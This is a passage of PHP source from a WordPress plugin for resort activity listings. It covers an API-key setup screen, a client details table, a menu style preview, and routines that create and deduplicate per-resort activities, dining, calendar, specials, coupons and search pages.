        ?>
        </script>
        <div id="wtd_modal" style="display:none;">
            <?php echo $modal_text;?>
        </div>
        <a href="javascript:void(0);" class="wtd_button" id="wtd_new_user">
            <i class="el-icon-user"></i>
            CREATE NEW USER
        </a>
        <ul class="wtd_error_ul" id="new_user_errors">
        </ul>
        </p>
    </div>
    <div id="info-import_feed" class="redux-normal  redux-info-field redux-field-info wtd_setup_box">
        <i class="el-icon-adult icon-large"></i>
        <h2>Existing User</h2>
        <p>
            <input type="text" id="wtd_api_key-text" placeholder="Enter your Client Key"/>
            <a href="javascript:void(0);" id="wtd_connector" class="wtd_button">
                <i class="el-icon-ok"></i>
                CONNECT
            </a>
            <a href="javascript:void(0);" id="wtd_pass_forgotten" class="wtd_button">
                <i class="el-icon-key"></i>
                Forgot key ?
            </a>
        <ul class="wtd_error_ul" id="wtd_api_errors"></ul>
        </p>
    </div>
    <div id="wtd_lost_key" style="display:none;">
        <div id="wtd_waiting_for_response" style="display:none;">
            <img src="<?php echo WTD_PLUGIN_URL.'/assets/img/wtd_wait.gif';?>" style="margin-top:65px;"/>
        </div>
        <div id="wtd_ask_for_mail">
            <ul id="wtd_lost_api_answer"></ul>
            <p style="margin-top:70px;">
                Please enter your e-mail address:
            </p>
            <input type="text" id="lost_key_email" style="float:left;width:100%;" placeholder="e.g. mail@domain.com"/>
            <a href="javascript:void(0)" class="button button-primary" id="wtd_send_lost" style="margin-top:15px;float:right;">Send Key</a>
        </div>
    </div>
    <style>
        .redux-main{
            margin-left:0px !important;
        }
        .redux-sidebar,.wtd_setup_page h3,.redux-container .redux-action_bar input,#wtd_new_email-error,.expand_options{
            display:none !important;
        }
    </style>
    <script>
        jQuery('.wtd_setup_page th').remove();
        jQuery('.redux-container #info_bar').hide();
        jQuery('#wtd_connector').click(function(event){
            event.preventDefault();
            var api_key = jQuery('#wtd_api_key-text').val();
            if (!api_key)
                jQuery('#wtd_api_key-text').focus();
            else{
                window.location = "<?php echo admin_url('admin.php?page=wtd_plugin_settings&connect_wtd_api=1');?>" + '&api_key=' + api_key;
            }
        });
        jQuery('#wtd_pass_forgotten').click(function(){
            tb_show("",'#TB_inline?width=307&height=260&inlineId=wtd_lost_key');
        });
        jQuery(document).on('click','#wtd_send_lost',function(event){
            event.preventDefault();
            var mail = jQuery('#lost_key_email').val();
            if (!mail)
                jQuery('#lost_key_email').focus();
            else{
                jQuery.ajax({
                    type: 'post',
                    dataType: 'json',
                    data:{
                        action: 'wtd_lost_key',
                        email: mail
                    },
                    url: "<?php echo admin_url('/admin-ajax.php');?>",
                    beforeSend:function(){
                        jQuery('#wtd_ask_for_mail').hide();
                        jQuery('#wtd_waiting_for_response').show();
                    },
                    success:function(data){
                        jQuery('#wtd_ask_for_mail').show();
                        jQuery('#wtd_waiting_for_response').hide();
                        console.log(data);
                    }
                });
            }
        });
    </script>
<?php
}

function wtd_client_details($field,$value){
    global $wpdb;
    $client_details = get_option('wtd_client_details');
    ?>
    <table class="form-table" id="client_table">
        <tr>
            <th>
                Company
            </th>
            <td>
                <?php echo $client_details['company'];?>
            </td>
        </tr>
        <tr>
            <th>
                Client Key
            </th>
            <td>
                <?php echo $client_details['api_key'];?>
            </td>
        </tr>
        <tr>
            <th>
                Paid Resorts
            </th>
            <td>
                <?php
                if (!empty($client_details['resorts_available'])){
                    $resorts = $wpdb->get_results(
                        'SELECT t.* FROM '.$wpdb->prefix.'terms t
                                                        JOIN '.$wpdb->prefix.'wtd_meta wm ON wm.term_id = t.term_id
                                                        JOIN '.$wpdb->prefix.'term_taxonomy tr ON tr.term_id = t.term_id
                                                        WHERE wm.meta_key = "res_id"
                                                        AND tr.taxonomy = "wtd_resort"
                                                        AND wm.wtd_term_id IN ('.implode(',',$client_details['resorts_available']).')'
                    );
                    foreach ($resorts as $key => $r)
                        echo '<span class="resort_tag">'.$r->name.'</span>';
                }else
                    echo 'None';
                ?>
            </td>
        </tr>
    </table>
<?php
}

function wtd_full_menu($field,$value){

    ob_start();
    ?>
    <link rel="stylesheet" href="<?php echo WTD_PLUGIN_URL.'assets/css/wtd_activities_page.css'; ?>" media="screen"/>
    <style>
        .typography-preview{
            display:none !Important;
        }
        .iris-picker{
            z-index:999 !important;
        }
    </style>
    <div id="wtd-navigator">
        <div class="wtd_parent_menu">
                <span class="wtd_parent_menu_item active">
                    <a href="javascript:void(0);">Item 1</a>
                </span>
                <span class="wtd_parent_menu_item">
                    <a href="javascript:void(0);">Item 2</a>
                </span>
                <span class="wtd_parent_menu_item">
                    <a href="javascript:void(0);">Item 3</a>
                </span>
                <span class="wtd_parent_menu_item">
                    <a href="javascript:void(0);">Item 4</a>
                </span>
                <span class="wtd_parent_menu_item">
                    <a href="javascript:void(0);">Item 5</a>
                </span>
                <span class="wtd_parent_menu_item">
                    <a href="javascript:void(0);">Item 6</a>
                </span>
                <span class="wtd_parent_menu_item">
                    <a href="javascript:void(0);">Item 7</a>
                </span>
        </div>
        <div class="wtd_contents">
            <div class="wtd_menu" style="display:block;">
                    <span class="wtd_menu_item">
                        <a href="javascript:void(0);" class="active">Subitem 1</a>
                    </span>
                    <span class="wtd_menu_item">
                        <a href="javascript:void(0);">Subitem 2</a>
                    </span>
                    <span class="wtd_menu_item">
                        <a href="javascript:void(0);">Subitem 3</a>
                    </span>
                    <span class="wtd_menu_item">
                        <a href="javascript:void(0);">Subitem 4</a>
                    </span>
                    <span class="wtd_menu_item">
                        <a href="javascript:void(0);">Subitem 5</a>
                    </span>
                    <span class="wtd_menu_item">
                        <a href="javascript:void(0);">Subitem 6</a>
                    </span>
                    <span class="wtd_menu_item">
                        <a href="javascript:void(0);">Subitem 7</a>
                    </span>
            </div>
        </div>
    </div>
    <?php
    $html = ob_get_clean();
    ?>
    <script>
        var wtd_big_menu = '<?php echo str_replace("\n",'',trim($html));?>';
        var wtd_parent_inactive_color = '';
        jQuery('.wtd_typograpy_panel.big_menu h3').after(wtd_big_menu);
        jQuery('#wtd_plugin-fm_parent_menu').before('<h3 style="margin:0px !important;">Parent Menu</h4>');
        jQuery('#wtd_plugin-fm_parent_menu_active').before('<h5 style="margin-bottom:0px !important;">Active Item</h5>');
        jQuery('#wtd_plugin-fm_parent_menu_active .picker-wrapper label').html('Background Color');
        jQuery('#wtd_plugin-fm_child_menu_background').before('<h3 style="margin-bottom:0px !important;margin-top:30px;">Child Menu</h4>');
        jQuery('#wtd_plugin-fm_child_menu_active').before('<h5 style="margin-bottom:0px !important;">Active Item</h5>');
        jQuery('#wtd_plugin-fm_child_menu_active .picker-wrapper label').html('Background Color');
        jQuery('#wtd_plugin-fm_child_menu_background .picker-wrapper label').html('Child Menu Background Color');
        function wtd_typo_change(mainID,family,size,transform,fontVariant,decoration,style,color,units){

            switch (mainID){
                case 'fm_parent_menu':
                    wtd_parent_inactive_color = color;
                    jQuery('#wtd-navigator .wtd_parent_menu span a').css({
                        'font-size' : size+units,
                        'font-weight' : style,
                        'text-decoration' : decoration,
                        'color' : color
                    });
                    jQuery('#wtd-navigator .wtd_parent_menu span.active a').css({'color' : '#fff'});
                    jQuery('#wtd-navigator .wtd_parent_menu span:not(.active)').hover(function(){
                        jQuery(this).find('a').css({'color' : '#fff'});
                    },function(){
                        jQuery(this).find('a').css({'color' : color});
                    });
                    break;
                case  'fm_parent_menu_active':
                    jQuery('#wtd-navigator .wtd_parent_menu span.active').css({
                        'background-color' : color
                    });
                    jQuery('#wtd-navigator .wtd_parent_menu span:not(.active)').hover(function(){
                        jQuery(this).css({ 'background' : color });
                    },function(){
                        jQuery(this).css({ 'background' : 'none' });
                    });
                    jQuery('#wtd-navigator .wtd_parent_menu span.active a').css({
                        'font-size' : size+units,
                        'font-weight' : style
                    });
                    break;
                case 'fm_child_menu':
                    wtd_parent_inactive_color = color;
                    jQuery('#wtd-navigator .wtd_menu .wtd_menu_item a').css({
                        'font-size' : size+units,
                        'font-weight' : style,
                        'text-decoration' : decoration,
                        'color' : color
                    });
                    jQuery('#wtd-navigator .wtd_menu .wtd_menu_item a.active').css({'color' : '#fff'});
                    jQuery('#wtd-navigator .wtd_menu .wtd_menu_item a:not(.active)').hover(function(){
                        jQuery(this).css({'color' : '#fff'});
                    },function(){
                        jQuery(this).css({'color' : color});
                    });
                    break;
                case  'fm_child_menu_active':
                    jQuery('#wtd-navigator .wtd_menu .wtd_menu_item a.active').css({
                        'background-color' : color
                    });
                    jQuery('#wtd-navigator .wtd_menu .wtd_menu_item a:not(.active)').hover(function(){
                        jQuery(this).css({ 'background' : color });
                    },function(){
                        jQuery(this).css({ 'background' : 'none' });
                    });
                    jQuery('#wtd-navigator .wtd_menu .wtd_menu_item a.active').css({
                        'font-size' : size+units,
                        'font-weight' : style
                    });
                    break;
                case  'fm_child_menu_background':
                    jQuery('#wtd-navigator .wtd_menu').css({
                        'background-color' : color
                    });
                    break;
            }
        }
        function wtd_color_changed( u, id ){
            setTimeout(function(){
                var color = jQuery('#' + id + '-color').val();
            },200);
        }

        var big_menu_design_id = jQuery('.big_menu').attr('id');
    </script>
<?php
}

function wtd_page_check($key){
    global $wpdb;
    $options = get_option('wtd_plugin');
    $wtd_pages = get_option('wtd_pages');
    $transient = 0;

    if ($key == 'activities-page'){
        if(!empty($options[$key])){
            if(!empty($options['wtd_resorts']))
                foreach ($options['wtd_resorts'] as $res_id) {
                    $options['activities_options']['page_style'][$res_id] = 1;
                    $options['activities_options']['dropdown'][$res_id] = 0;
                    $options['activities_options']['mosaic'][$res_id] = 1;
                    $args = array(
                        'post_type' => 'page',
                        'orderby' => 'ID',
                        'order' => 'ASC',
                        'meta_query' => array(
                            array(
                                'key' => 'wtd_page',
                                'value' => 'activities_page'
                            ),
                            array(
                                'key' => 'res_id',
                                'value' => $res_id
                            )
                        )
                    );
                    $page_query = new WP_Query($args);
                    if (!$page_query->found_posts) {
                        $transient = 1;
                        $resort = get_term($res_id, 'wtd_resort');
                        $rname = explode(',', $resort->name);
                        $new_page = array(
                            'post_title' => $rname[0] . ' Activities',
                            'post_content' => '',
                            'post_type' => 'page',
                            'post_status' => 'publish'
                        );
                        $page_id = wp_insert_post($new_page);
                        update_post_meta($page_id, 'wtd_page', 'activities_page');
                        update_post_meta($page_id, 'res_id', $res_id);
                        if (empty($wtd_pages['activities_pages']))
                            $wtd_pages['activities_pages'] = array($res_id => $page_id);
                        else
                            $wtd_pages['activities_pages'][$res_id] = $page_id;

                    } elseif(!empty($wtd_pages['activities_pages']))
                        if (!in_array($page_query->posts[0]->ID, $wtd_pages['activities_pages'])) {
                            $transient = 1;

                            for($i = 1; $i < $page_query->found_posts; $i++)
                                wp_delete_post($page_query->posts[$i]->ID, true);

                            $wtd_pages['activities_pages'][$res_id] = $page_query->posts[0]->ID;

                        }

                }
        }
    }

    //Dining
    if ($key == 'dining-page'){
        if(!empty($options[$key])) {
            if (!empty($options['wtd_resorts']))
                foreach ($options['wtd_resorts'] as $res_id) {
                    $args = array(
                        'post_type' => 'page',
                        'orderby' => 'ID',
                        'order' => 'ASC',
                        'meta_query' => array(
                            array(
                                'key' => 'wtd_page',
                                'value' => 'dining_page'
                            ),
                            array(
                                'key' => 'res_id',
                                'value' => $res_id
                            )
                        )
                    );
                    $page_query = new WP_Query($args);
                    if (!$page_query->found_posts) {
                        $transient = 1;
                        $resort = get_term($res_id, 'wtd_resort');
                        $rname = explode(',', $resort->name);
                        $new_page = array(
                            'post_title' => $rname[0] . ' Dining',
                            'post_content' => '',
                            'post_type' => 'page',
                            'post_status' => 'publish'
                        );
                        $page_id = wp_insert_post($new_page);
                        update_post_meta($page_id, 'wtd_page', 'dining_page');
                        update_post_meta($page_id, 'res_id', $res_id);
                        if (empty($wtd_pages['dining_pages']))
                            $wtd_pages['dining_pages'] = array($res_id => $page_id);
                        else
                            $wtd_pages['dining_pages'][$res_id] = $page_id;
                    } elseif(!empty($wtd_pages['dining_pages']))
                        if (!in_array($page_query->posts[0]->ID, $wtd_pages['dining_pages'])) {
                            $transient = 1;

                            for($i = 1; $i < $page_query->found_posts; $i++)
                                wp_delete_post($page_query->posts[$i]->ID, true);

                            $wtd_pages['dining_pages'][$res_id] = $page_query->posts[0]->ID;

                        }
                }
        }
    }

    //Map
//    if ($key == 'map-page'){
//        if(!empty($options[$key])){
//            if(!empty($options['wtd_resorts']))
//                foreach ($options['wtd_resorts'] as $res_id){
//                    wtd_check_post_type(
//                        array(
//                            'post_type' => 'wtd_activity',
//                            'page' => $key,
//                            'res_id' => $res_id,
//                            'limit' => 100,
//                            'type' => 'activities'
//                        )
//                    );
//                    $res_term = $wpdb->get_var(
//                        $wpdb->prepare(
//                            'SELECT wtd_term_id FROM '.$wpdb->prefix.'wtd_meta WHERE term_id = %s AND meta_key = "res_id" LIMIT 1',
//                            $res_id
//                        )
//                    );
//                    $options['map_position'][$res_id]['lat'] = $options['user_map']['lat'];
//                    $options['map_position'][$res_id]['lng'] = $options['user_map']['lng'];
//                    $args = array(
//                        'post_type' => 'page',
//                        'orderby' => 'ID',
//                        'order' => 'ASC',
//                        'meta_query' => array(
//                            array(
//                                'key' => 'wtd_page',
//                                'value' => 'map_page'
//                            ),
//                            array(
//                                'key' => 'res_id',
//                                'value' => $res_id
//                            )
//                        )
//                    );
//                    $page_query = new WP_Query($args);
//                    if (!$page_query->found_posts){
//                        $transient = 1;
//                        $resort = get_term($res_id,'wtd_resort');
//                        $rname = explode(',',$resort->name);
//                        $new_page = array(
//                            'post_title' => $rname[0].' Map',
//                            'post_content' => '',
//                            'post_type' => 'page',
//                            'post_status' => 'publish'
//                        );
//                        $page_id = wp_insert_post($new_page);
//                        update_post_meta($page_id,'wtd_page','map_page');
//                        update_post_meta($page_id,'res_id',$res_id);
//                        if (empty($wtd_pages['map_pages']))
//                            $wtd_pages['map_pages'] = array($res_id => $page_id);
//                        else
//                            $wtd_pages['map_pages'][$res_id] = $page_id;
//                    } elseif(!empty($wtd_pages['map_pages']))
//                        if (!in_array($page_query->posts[0]->ID, $wtd_pages['map_pages'])) {
//                            $transient = 1;
//
//                            for($i = 1; $i < $page_query->found_posts; $i++)
//                                wp_delete_post($page_query->posts[$i]->ID, true);
//
//                            $wtd_pages['map_pages'][$res_id] = $page_query->posts[0]->ID;
//
//                        }
//                }
//        }
//    }

    //Calendar
    if ($key == 'calendar-page') {
        if(!empty($options[$key])) {
            if(!empty($options['wtd_resorts'])) {
                foreach ($options['wtd_resorts'] as $res_id) {
                    $args = array(
                        'post_type' => 'page',
                        'orderby' => 'ID',
                        'order' => 'ASC',
                        'meta_query' => array(
                            array(
                                'key' => 'wtd_page',
                                'value' => 'calendar_page'
                            ),
                            array(
                                'key' => 'res_id',
                                'value' => $res_id
                            )
                        )
                    );
                    $page_query = new WP_Query($args);
                    if (!$page_query->found_posts) {
                        $transient = 1;
                        $options['calendar_options']['page_style'][$res_id] = 1;
                        $resort = get_term($res_id, 'wtd_resort');
                        $rname = explode(',', $resort->name);
                        $new_page = array(
                            'post_title' => $rname[0] . ' Events Calendar',
                            'post_content' => '',
                            'post_type' => 'page',
                            'post_status' => 'publish'
                        );
                        $page_id = wp_insert_post($new_page);
                        update_post_meta($page_id, 'wtd_page', 'calendar_page');
                        update_post_meta($page_id, 'res_id', $res_id);
                        if (empty($wtd_pages['calendar_pages']))
                            $wtd_pages['calendar_pages'] = array($res_id => $page_id);
                        else
                            $wtd_pages['calendar_pages'][$res_id] = $page_id;
                    } elseif (!empty($wtd_pages['calendar_pages'])){
                        if (!in_array($page_query->posts[0]->ID, $wtd_pages['calendar_pages'])) {
                            $transient = 1;

                            for ($i = 1; $i < $page_query->found_posts; $i++)
                                wp_delete_post($page_query->posts[$i]->ID, true);

                            $wtd_pages['calendar_pages'][$res_id] = $page_query->posts[0]->ID;

                        }
                    }
                }
                $args = array(
                    'post_type' => 'wtd_event',
                    'orderby' => 'ID',
                    'order' => 'ASC'
                );
                $post_query = new WP_Query($args);
                if (!$post_query->found_posts) {
                    $new_post = array(
                        'post_title' => 'WTD Event',
                        'post_content' => '',
                        'post_name' => 'wtd-event',
                        'post_type' => 'wtd_event',
                        'post_status' => 'publish'
                    );
                    $post = wp_insert_post($new_post);
                }
            }
        }
    }

    //Week
    if ($key == 'week-page') {
        if(!empty($options[$key])) {
            if(!empty($options['wtd_resorts'])) {
                foreach ($options['wtd_resorts'] as $res_id) {
                    $args = array(
                        'post_type' => 'page',
                        'orderby' => 'ID',
                        'order' => 'ASC',
                        'meta_query' => array(
                            array(
                                'key' => 'wtd_page',
                                'value' => 'week_page'
                            ),
                            array(
                                'key' => 'res_id',
                                'value' => $res_id
                            )
                        )
                    );
                    $page_query = new WP_Query($args);
                    if (!$page_query->found_posts) {
                        $transient = 1;
                        $options['calendar_options']['page_style'][$res_id] = 1;
                        $resort = get_term($res_id, 'wtd_resort');
                        $rname = explode(',', $resort->name);
                        $new_page = array(
                            'post_title' => $rname[0] . ' Events This Week',
                            'post_content' => '',
                            'post_type' => 'page',
                            'post_status' => 'publish'
                        );
                        $page_id = wp_insert_post($new_page);
                        update_post_meta($page_id, 'wtd_page', 'week_page');
                        update_post_meta($page_id, 'res_id', $res_id);
                        if (empty($wtd_pages['week_pages']))
                            $wtd_pages['week_pages'] = array($res_id => $page_id);
                        else
                            $wtd_pages['week_pages'][$res_id] = $page_id;
                    } elseif (!empty($wtd_pages['week_pages']))
                        if (!in_array($page_query->posts[0]->ID, $wtd_pages['week_pages'])) {
                            $transient = 1;

                            for ($i = 1; $i < $page_query->found_posts; $i++)
                                wp_delete_post($page_query->posts[$i]->ID, true);

                            $wtd_pages['week_pages'][$res_id] = $page_query->posts[0]->ID;

                        }
                }
                $args = array(
                    'post_type' => 'wtd_event',
                    'orderby' => 'ID',
                    'order' => 'ASC'
                );
                $post_query = new WP_Query($args);
                if (!$post_query->found_posts) {
                    $new_post = array(
                        'post_title' => 'WTD Event',
                        'post_content' => '',
                        'post_name' => 'wtd-event',
                        'post_type' => 'wtd_event',
                        'post_status' => 'publish'
                    );
                    $post = wp_insert_post($new_post);
                }
            }
        }
    }

    //Week Specials
    if ($key == 'week-specials-page') {
        if(!empty($options[$key])) {
            if(!empty($options['wtd_resorts'])) {
                foreach ($options['wtd_resorts'] as $res_id) {
                    $args = array(
                        'post_type' => 'page',
                        'orderby' => 'ID',
                        'order' => 'ASC',
                        'meta_query' => array(
                            array(
                                'key' => 'wtd_page',
                                'value' => 'week_specials_page'
                            ),
                            array(
                                'key' => 'res_id',
                                'value' => $res_id
                            )
                        )
                    );
                    $page_query = new WP_Query($args);
                    if (!$page_query->found_posts) {
                        $transient = 1;
                        $resort = get_term($res_id, 'wtd_resort');
                        $rname = explode(',', $resort->name);
                        $new_page = array(
                            'post_title' => $rname[0] . ' Specials This Week',
                            'post_content' => '',
                            'post_type' => 'page',
                            'post_status' => 'publish'
                        );
                        $page_id = wp_insert_post($new_page);
                        update_post_meta($page_id, 'wtd_page', 'week_specials_page');
                        update_post_meta($page_id, 'res_id', $res_id);
                        if (empty($wtd_pages['week_specials_pages']))
                            $wtd_pages['week_specials_pages'] = array($res_id => $page_id);
                        else
                            $wtd_pages['week_specials_pages'][$res_id] = $page_id;
                    } elseif (!empty($wtd_pages['week_specials_pages']))
                        if (!in_array($page_query->posts[0]->ID, $wtd_pages['week_specials_pages'])) {
                            $transient = 1;

                            for ($i = 1; $i < $page_query->found_posts; $i++)
                                wp_delete_post($page_query->posts[$i]->ID, true);

                            $wtd_pages['week_specials_pages'][$res_id] = $page_query->posts[0]->ID;

                        }
                }
                $args = array(
                    'post_type' => 'wtd_special',
                    'orderby' => 'ID',
                    'order' => 'ASC'
                );
                $post_query = new WP_Query($args);
                if (!$post_query->found_posts) {
                    $new_post = array(
                        'post_title' => 'WTD Special',
                        'post_content' => '',
                        'post_name' => 'wtd-special',
                        'post_type' => 'wtd_special',
                        'post_status' => 'publish'
                    );
                    $post = wp_insert_post($new_post);
                }
            }
        }
    }

    //Coupons
    if ($key == 'coupons-page'){
        if(!empty($options[$key])){
            if(!empty($options['wtd_resorts']))
                foreach ($options['wtd_resorts'] as $res_id){
                    $options['coupons_options']['page_style'][$res_id] = 1;
                    $options['coupons_options']['dropdown'][$res_id] = 0;
                    $args = array(
                        'post_type' => 'page',
                        'orderby' => 'ID',
                        'order' => 'ASC',
                        'meta_query' => array(
                            array(
                                'key' => 'wtd_page',
                                'value' => 'coupons_page'
                            ),
                            array(
                                'key' => 'res_id',
                                'value' => $res_id
                            )
                        )
                    );
                    $page_query = new WP_Query($args);
                    if (!$page_query->found_posts){
                        $transient = 1;
                        $resort = get_term($res_id,'wtd_resort');
                        $rname = explode(',',$resort->name);
                        $new_page = array(
                            'post_title' => $rname[0].' Coupons',
                            'post_content' => '',
                            'post_type' => 'page',
                            'post_status' => 'publish'
                        );
                        $page_id = wp_insert_post($new_page);
                        update_post_meta($page_id,'wtd_page','coupons_page');
                        update_post_meta($page_id,'res_id',$res_id);
                        if (empty($wtd_pages['coupons_pages']))
                            $wtd_pages['coupons_pages'] = array($res_id => $page_id);
                        else
                            $wtd_pages['calendar_pages'][$res_id] = $page_id;
                    } elseif(!empty($wtd_pages['coupons_pages']))
                        if (!in_array($page_query->posts[0]->ID, $wtd_pages['coupons_pages'])) {
                            $transient = 1;

                            for($i = 1; $i < $page_query->found_posts; $i++)
                                wp_delete_post($page_query->posts[$i]->ID, true);

                            $wtd_pages['coupons_pages'][$res_id] = $page_query->posts[0]->ID;

                        }
                }
        }
    }

    //Specials
    if ($key == 'specials-page'){
        if(!empty($options[$key])){
            if(!empty($options['wtd_resorts'])) {
                foreach ($options['wtd_resorts'] as $res_id) {
                    $args = array(
                        'post_type' => 'page',
                        'orderby' => 'ID',
                        'order' => 'ASC',
                        'meta_query' => array(
                            array(
                                'key' => 'wtd_page',
                                'value' => 'specials_page'
                            ),
                            array(
                                'key' => 'res_id',
                                'value' => $res_id
                            )
                        )
                    );
                    $page_query = new WP_Query($args);
                    if (!$page_query->found_posts) {
                        $transient = 1;
                        $resort = get_term($res_id, 'wtd_resort');
                        $rname = explode(',', $resort->name);
                        $new_page = array(
                            'post_title' => $rname[0] . ' Specials',
                            'post_content' => '',
                            'post_type' => 'page',
                            'post_status' => 'publish'
                        );
                        $page_id = wp_insert_post($new_page);
                        update_post_meta($page_id, 'wtd_page', 'specials_page');
                        update_post_meta($page_id, 'res_id', $res_id);
                        if (empty($wtd_pages['specials_pages']))
                            $wtd_pages['specials_pages'] = array($res_id => $page_id);
                        else
                            $wtd_pages['specials_pages'][$res_id] = $page_id;
                    } elseif (!empty($wtd_pages['specials_pages']))
                        if (!in_array($page_query->posts[0]->ID, $wtd_pages['specials_pages'])) {
                            $transient = 1;

                            for ($i = 1; $i < $page_query->found_posts; $i++)
                                wp_delete_post($page_query->posts[$i]->ID, true);

                            $wtd_pages['specials_pages'][$res_id] = $page_query->posts[0]->ID;

                        }
                }
                $args = array(
                    'post_type' => 'wtd_special',
                    'orderby' => 'ID',
                    'order' => 'ASC'
                );
                $post_query = new WP_Query($args);
                if (!$post_query->found_posts) {
                    $new_post = array(
                        'post_title' => 'WTD Special',
                        'post_content' => '',
                        'post_name' => 'wtd-special',
                        'post_type' => 'wtd_special',
                        'post_status' => 'publish'
                    );
                    $post = wp_insert_post($new_post);
                }
            }
        }
    }
    //Search
    if ($key == 'search-page'){
        if(!empty($options[$key])){
            $args = array(
                'post_type' => 'page',
                'orderby' => 'ID',
                'order' => 'ASC',
                'meta_query' => array(
                    array(
                        'key' => 'wtd_page',
                        'value' => 'search_page'
                    )
                )
            );
            $page_query = new WP_Query($args);
            if (!$page_query->found_posts){
                $transient = 1;
                $new_page = array(
                    'post_title' => 'Search',
                    'post_content' => '',
                    'post_type' => 'page',
                    'post_status' => 'publish'
                );
                $page_id = wp_insert_post($new_page);
                update_post_meta($page_id,'wtd_page','search_page');
                if (empty($wtd_pages['search_page']))
                    $wtd_pages['search_page'] = array( $page_id);
                else
                    $wtd_pages['search_page'][] = $page_id;
            } elseif(!empty($wtd_pages['search_page'])) {
                if (!in_array($page_query->posts[0]->ID, $wtd_pages['search_page'])) {
                    $transient = 1;

                    for ($i = 1; $i < $page_query->found_posts; $i++)
                        wp_delete_post($page_query->posts[$i]->ID, true);

                    $wtd_pages['search_page'][] = $page_query->posts[0]->ID;

                }
            }
        }else{
            $args = array(
                'post_type' => 'page',
                'orderby' => 'ID',
                'order' => 'ASC',
                'meta_query' => array(
                    array(
                        'key' => 'wtd_page',
                        'value' => 'search_page'
                    )
                )
            );
            $page_query = new WP_Query($args);
            foreach($page_query->posts as $post)
                wp_delete_post($post->ID, true);
            $wtd_pages['search_page'] = array();

        }
    }


    update_option('wtd_plugin',$options);
    update_option('wtd_pages',$wtd_pages);
}

function wtd_check_post_type($pair){
    global $wpdb;
    $res_term_id = $wpdb->get_var(
        'SELECT term_id FROM '.$wpdb->prefix.'wtd_meta WHERE meta_key = "cat_id" AND wtd_term_id = 6 LIMIT 1'
    );
    $terms = false;
    switch ($pair['page']){
        case 'dining-page':
            $terms =  get_terms('wtd_category',array(
                'resorts' => array($pair['res_id']),
                'post_type' => array($pair['post_type']),
                'parent' => $res_term_id
            ));
            break;
        case 'activities-page':
            $terms =  get_terms('wtd_category',array(
                'resorts' => array($pair['res_id']),
                'post_type' => array($pair['post_type']),
                'exclude_tree' => $res_term_id
            ));
            break;
//        case 'map-page':
//            $terms =  get_terms('wtd_category',array(
//                'resorts' => array($pair['res_id']),
//                'post_type' => array($pair['post_type']),
//                'exclude_tree' => $res_term_id
//            ));
//            break;
        default:
            $terms = get_terms('wtd_category',array(
                'hide_empty' => true,
                'resorts' => array($pair['res_id']),
                'post_type' => array($pair['post_type'])
            ));
            break;

    }
    $check_activities = 0;
    if (!empty($terms)){
        foreach ($terms as $term)
            $check_activities += $term->count;
    }
    $wtd_syncing = get_option('wtd_syncing');
    if ($check_activities < $pair['limit'] && empty($wtd_syncing)) {
        global $global_pair;
        if (empty($global_pair)) {
            $global_pair = $pair;
            add_action('admin_init', 'wtd_late_redirect', 99999);
        }

    }
}

function wtd_late_redirect(){
    global $global_pair;
    $pair = $global_pair;
    $wtd_sync = get_option('wtd_syncing');
    if (empty($wtd_sync) && !empty($pair)) {
        echo '<script>window.location="' . admin_url('admin.php?page=wtd_plugin_settings&wtd_reload=' . $pair['type'] . '&wtd_page=' . $pair['page']) . '";</script>';
        die();
    }
}


function wtd_shortcode_temp($field, $value){
    global $wpdb;
    $place="shortcode_options";

    $exclude = array();

    $options = get_option('wtd_plugin');

    global $wtd_redux_config;
    $cats = $wtd_redux_config->mapped_categories['activities'];

    foreach ($exclude as $x)
        unset($cats[$x]);

    foreach ($options['wtd_resorts'] as $resort){
        echo '<div class="category_full resort_hide" data-place="'.$place.'">';
        foreach ($cats as $pcat){
            $cat = $pcat['parent'];
            $cat_enable = 'selected';
            $cat_disable = '';
            if (!empty($options[$place][$resort][$cat->term_id]['parent'])){
                $cat_enable = '';
                $cat_disable = 'selected';
            }
            ?>
            <div id="<?php echo $place.'_';?><?php echo $resort;?>_parent_term_<?php echo $cat->term_id;?>" class="wtd_cat_container">
                <fieldset class="redux-field-container redux-field redux-container-switch" data-id="category-<?php echo $cat->term_id;?>" data-type="switch">
                    <div class="switch-options">
                        <label class="cb-enable <?php echo $cat_enable;?> wtd_shortcode_button" data-place="<?php echo $place;?>" data-term="<?php echo $cat->term_id;?>" data-val="1" data-resort="<?php echo $resort;?>">
                            <span>Show</span>
                        </label>
                        <label class="cb-disable <?php echo $cat_disable;?> wtd_shortcode_button" data-place="<?php echo $place;?>"  data-term="<?php echo $cat->term_id;?>" data-val="0" data-resort="<?php echo $resort;?>">
                            <span>Hide</span>
                        </label>
                    </div>
                </fieldset>
                <span>Show/Hide "<?php echo $cat->name;?>" Category</span>
                <hr/>
                <h4>Disable individual Subcategories</h4>
                <?php
                $ch = $pcat['children'];
                foreach ($ch as $c){
                    $icon = 'el-icon-check';
                    $class = 'button-primary';
                    if (!empty($options[$place][$resort][$cat->term_id]['children'][$c->term_id]) || !empty($options[$place][$resort][$cat->term_id]['parent'])){
                        $icon = "el-icon-check-empty";
                        $class = '';
                    }
                    echo '<a href="javascript:void(0);" title="'.$c->name.'" data-term="'.$c->term_id.'" data-parent="'.$cat->term_id.'" data-place="'.$place.'" data-resort="'.$resort.'" class="wtd_shortcode_button wtd_scat button '.$class.'"><label class="term-count">'.$c->count.'</label><span>'.$c->name.'</span><i class="'.$icon.'"></i></a>';

                }
                ?>
            </div>
        <?php
        }
        echo '</div>';
    }

}

function wtd_shortcode_options($field, $value){
    global $wpdb;
    $place="shortcode_options";
    ?>
    <fieldset class="redux-field-container redux-field redux-container-button_set" data-type="button_set">
        <span>Select resort</span>
        <section class="buttonset ui-buttonset wtd_resorts_selector">
            <?php
            $options = get_option('wtd_plugin');
            $right = count($options['wtd_resorts']) - 1;
            foreach ($options['wtd_resorts'] as $key => $resort){
                $rpost = $wpdb->get_row(
                    $wpdb->prepare(
                        'SELECT * FROM '.$wpdb->terms.' WHERE term_id = %d LIMIT 1',
                        $resort
                    )
                );
                if ($key == 0)
                    $bclass = 'ui-corner-left';
                elseif ($key == $right)
                    $bclass = 'ui-corner-right';
                else
                    $bclass = '';
                ?>
                <label class="ui-button ui-widget ui-state-default ui-button-text-only resort_selector <?php echo $bclass;?>" data-resort="<?php echo $resort;?>" data-place="<?php echo $place;?>" role="button" aria-disabled="false">
                    <span class="ui-button-text"><?php echo $rpost->name;?></span>
                </label>
            <?php } ?>
        </section>
        <hr/>
    </fieldset>
    <?php

    $not_allowed = $wpdb->get_results(
        'SELECT term_id FROM '.$wpdb->prefix.'wtd_meta WHERE meta_key = "cat_id" AND wtd_term_id IN (6,903,1008) LIMIT 3'
    );
    $exclude = array();
